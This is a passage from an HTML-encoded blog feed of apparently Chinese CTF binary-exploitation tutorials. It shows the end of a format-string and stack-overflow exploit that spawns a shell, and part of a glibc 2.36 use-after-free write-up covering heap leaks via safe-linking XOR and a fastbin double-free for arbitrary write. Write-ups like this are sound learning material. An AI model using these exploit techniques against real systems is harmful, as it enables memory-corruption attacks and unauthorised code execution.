class=&#34;number&#34;&gt;1&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendline(captcha)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 读取libc地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendafter(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;Prompt: &amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;f&amp;#x27;%&lt;span class=&#34;subst&#34;&gt;&amp;#123;(&lt;span class=&#34;number&#34;&gt;0xd8&lt;/span&gt;&amp;gt;&amp;gt;&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)+&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;&amp;#125;&lt;/span&gt;$p&amp;#x27;&lt;/span&gt;.encode()[::-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]) &lt;span class=&#34;comment&#34;&gt;# __isoc99_scanf+178&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;FakeGPT: 0x&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;addr = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(io.recv(&lt;span class=&#34;number&#34;&gt;12&lt;/span&gt;), &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libcbase = addr - &lt;span class=&#34;number&#34;&gt;0x621c2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onegadget = libcbase + &lt;span class=&#34;number&#34;&gt;0x50a37&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(onegadget))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 读取canary&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendafter(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;Prompt: &amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;f&amp;#x27;%&lt;span class=&#34;subst&#34;&gt;&amp;#123;(&lt;span class=&#34;number&#34;&gt;0x1a8&lt;/span&gt;&amp;gt;&amp;gt;&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)+&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;&amp;#125;&lt;/span&gt;$p&amp;#x27;&lt;/span&gt;.encode()[::-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]) &lt;span class=&#34;comment&#34;&gt;# __isoc99_scanf+178&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;FakeGPT: 0x&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;canary = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(io.recv(&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;), &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(canary))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;input3 = &lt;span class=&#34;string&#34;&gt;b&amp;quot;b&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x197&lt;/span&gt; + p64(canary)+p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)+p64(onegadget)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendline(input3[::-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

</content>
        <category term="PWN入门" />
        <updated>2023-05-22T03:39:48.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-26-2-36%E7%89%88%E6%9C%ACuaf%E5%88%A9%E7%94%A8/</id>
        <title>pwn入门-26-2.36版本uaf利用</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-26-2-36%E7%89%88%E6%9C%ACuaf%E5%88%A9%E7%94%A8/"/>
        <content type="html">&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[*] &lt;span class=&#34;string&#34;&gt;&amp;#x27;/home/ubuntu/511/pwn/pwn&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Arch:     amd64&lt;span class=&#34;number&#34;&gt;-64&lt;/span&gt;-little&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    RELRO:    Partial RELRO&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Stack:    No canary found&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    NX:       NX enabled&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    PIE:      PIE enabled&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;heap: This command only works with libc debug symbols.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/m0_51251108/article/details/127098744&#34;&gt;https://blog.csdn.net/m0_51251108/article/details/127098744&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;符号表 not striped&lt;/p&gt;
&lt;p&gt;name那里可以输出栈上的数据 &lt;/p&gt;
&lt;h1 id=&#34;解题思路&#34;&gt;&lt;a href=&#34;#解题思路&#34; class=&#34;headerlink&#34; title=&#34;解题思路&#34;&gt;&lt;/a&gt;解题思路&lt;/h1&gt;&lt;h2 id=&#34;堆地址泄露-利用UAF&#34;&gt;&lt;a href=&#34;#堆地址泄露-利用UAF&#34; class=&#34;headerlink&#34; title=&#34;堆地址泄露(利用UAF)&#34;&gt;&lt;/a&gt;堆地址泄露(利用UAF)&lt;/h2&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;delete(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;Name: &amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sec=u64(p.recv(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;delete(&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show(&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;Name: &amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;heap_sec=u64(p.recv(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;heap_addr=heap_sec^sec&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(heap_addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stack_addr=u64(p.recv(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(stack_addr))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		sec和heap_sec异或得到堆地址,那么它们是什么呢?&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x560399e28450&lt;/span&gt;  &lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;      &lt;span class=&#34;number&#34;&gt;0x0000000000000041&lt;/span&gt;      ........A.......&amp;lt;-- fastbins[&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;][&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x560399e28460&lt;/span&gt;  &lt;span class=&#34;number&#34;&gt;0x0000000560399e28&lt;/span&gt;      &lt;span class=&#34;number&#34;&gt;0x00007ffef806f270&lt;/span&gt;      (&lt;span class=&#34;number&#34;&gt;.9&lt;/span&gt;`....p.......&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x560399e28470&lt;/span&gt;  &lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;      &lt;span class=&#34;number&#34;&gt;0x00007ffef806f3b8&lt;/span&gt;      ................&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x560399e28480&lt;/span&gt;  &lt;span class=&#34;number&#34;&gt;0x0000000064646464&lt;/span&gt;      &lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;      dddd............&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x560399e28490&lt;/span&gt;  &lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;      &lt;span class=&#34;number&#34;&gt;0x0000000000000041&lt;/span&gt;      ........A.......&amp;lt;-- fastbins[&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;][&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x560399e284a0&lt;/span&gt;  &lt;span class=&#34;number&#34;&gt;0x00005606f9db1a78&lt;/span&gt;      &lt;span class=&#34;number&#34;&gt;0x00007ffef806f270&lt;/span&gt;      x....V..p.......&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x560399e284b0&lt;/span&gt;  &lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;      &lt;span class=&#34;number&#34;&gt;0x00007ffef806f3b8&lt;/span&gt;      ................&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x560399e284c0&lt;/span&gt;  &lt;span class=&#34;number&#34;&gt;0x0000000064646464&lt;/span&gt;      &lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		 0x0000000560399e28 ^  0x00005606f9db1a78 &amp;#x3D; 0x560399e28450&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;fastbin&lt;/code&gt; 堆指针异或加密（&lt;code&gt;glibc-2.32&lt;/code&gt; 引入）&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://www.suphp.cn/anquanke/86/236186.html&#34;&gt;http://www.suphp.cn/anquanke/86/236186.html&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;需要泄露两次,两个相邻的fastbin,泄露它们fd位置的值,然后异或就得到了前面那个fastbin的地址了&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://bbs.kanxue.com/thread-272098.htm#msg_header_h2_2&#34;&gt;https://bbs.kanxue.com/thread-272098.htm#msg_header_h2_2&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;泄露栈地址&#34;&gt;&lt;a href=&#34;#泄露栈地址&#34; class=&#34;headerlink&#34; title=&#34;泄露栈地址&#34;&gt;&lt;/a&gt;泄露栈地址&lt;/h2&gt;&lt;p&gt;​		为什么bk这里存储着栈地址呢?&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-26-2-36%E7%89%88%E6%9C%ACuaf%E5%88%A9%E7%94%A8/image-20230517124416111.png&#34; alt=&#34;image-20230517124416111&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		是在add的时候,放入的地址???&lt;/p&gt;
&lt;p&gt;奇怪..一步一步调试的话,栈上数据就没有..不然就有…&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-26-2-36%E7%89%88%E6%9C%ACuaf%E5%88%A9%E7%94%A8/image-20230517135521634.png&#34; alt=&#34;image-20230517135521634&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;构造double-free链-任意地址写&#34;&gt;&lt;a href=&#34;#构造double-free链-任意地址写&#34; class=&#34;headerlink&#34; title=&#34;构造double free链,任意地址写&#34;&gt;&lt;/a&gt;构造double free链,任意地址写&lt;/h2&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;delete(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.........&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;delte(&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;........&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;delete(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;## 构成环了&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;victim=stack_addr-&lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;## &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(victim))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;):            &lt;span class=&#34;comment&#34;&gt;## 先使用tcachebin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    add(i+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;aaa&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;dddd&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pay1=p64(sec^victim)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;12&lt;/span&gt;,pay1,&lt;span class=&#34;number&#34;&gt;0x8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;\x00&amp;#x27;&lt;/span&gt;)      &lt;span class=&#34;comment&#34;&gt;## 三个fastbin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;13&lt;/span&gt;,pay1,&lt;span class=&#34;number&#34;&gt;0x8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;14&lt;/span&gt;,pay1,&lt;span class=&#34;number&#34;&gt;0x8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;15&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;ccc&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show(&lt;span class=&#34;number&#34;&gt;15&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		victim就是要写入的地址,因为有异或机制,所以要和sec异或一下,再写入&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-26-2-36%E7%89%88%E6%9C%ACuaf%E5%88%A9%E7%94%A8/image-20230517140406404.png&#34; alt=&#34;image-20230517140406404&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		为什么添加完三个fastbin,又会多了tcachebin…	斯….和tcachebin的机制有关…在分配第一个fastbin的时候,就给他们放到tcachebin中了…&lt;/p&gt;
&lt;h2 id=&#34;栈地址怎么来的&#34;&gt;&lt;a href=&#34;#栈地址怎么来的&#34; class=&#34;headerlink&#34; title=&#34;栈地址怎么来的?&#34;&gt;&lt;/a&gt;栈地址怎么来的?&lt;/h2&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;15&lt;/span&gt;,b&lt;span class=&#34;number&#34;&gt;&amp;#x27;&lt;/span&gt;ccc&lt;span class=&#34;number&#34;&gt;&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x8&lt;/span&gt;,b&lt;span class=&#34;number&#34;&gt;&amp;#x27;&lt;/span&gt;\x00&lt;span class=&#34;number&#34;&gt;&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show(&lt;span class=&#34;number&#34;&gt;15&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;Name: &amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recv(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pie_base_addr=u64(p.recv(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;).ljust(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,b&lt;span class=&#34;number&#34;&gt;&amp;#x27;&lt;/span&gt;\x00&lt;span class=&#34;number&#34;&gt;&amp;#x27;&lt;/span&gt;))&lt;span class=&#34;number&#34;&gt;-0x1794&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(&lt;span class=&#34;string&#34;&gt;&amp;#x27;pie: &amp;#x27;&lt;/span&gt;+hex(pie_base_addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(hex(stack_addr))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;-0x1794要根据具体版本变化,vmmap看到基址, 两个一减就得到了&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-26-2-36%E7%89%88%E6%9C%ACuaf%E5%88%A9%E7%94%A8/image-20230517152151353.png&#34; alt=&#34;image-20230517152151353&#34;&gt;&lt;/p&gt;
&lt;p&gt;​	这个地址是怎么来的呢?&lt;/p&gt;
&lt;p&gt;找不到是谁打印出的pie: 0x55b9c409d794…&lt;/p&gt;
&lt;p&gt;find 0x7ffc27616000 to 0x7ffc27805000,0x55b9c409d794&lt;/p&gt;
&lt;p&gt;​	下断点到show函数,一步步查看&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-26-2-36%E7%89%88%E6%9C%ACuaf%E5%88%A9%E7%94%A8/image-20230517151004919.png&#34; alt=&#34;image-20230517151004919&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		是在这里打印出来的,可是为什么这里会存储着这个地址呢??&lt;/p&gt;
&lt;p&gt;​		在add中malloc分配空间的时候会分配到这附近..&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-26-2-36%E7%89%88%E6%9C%ACuaf%E5%88%A9%E7%94%A8/image-20230517151632379.png&#34; alt=&#34;image-20230517151632379&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-26-2-36%E7%89%88%E6%9C%ACuaf%E5%88%A9%E7%94%A8/image-20230517152033215.png&#34; alt=&#34;image-20230517152033215&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;glibc地址获取&#34;&gt;&lt;a href=&#34;#glibc地址获取&#34; class=&#34;headerlink&#34; title=&#34;glibc地址获取&#34;&gt;&lt;/a&gt;glibc地址获取&lt;/h2&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span 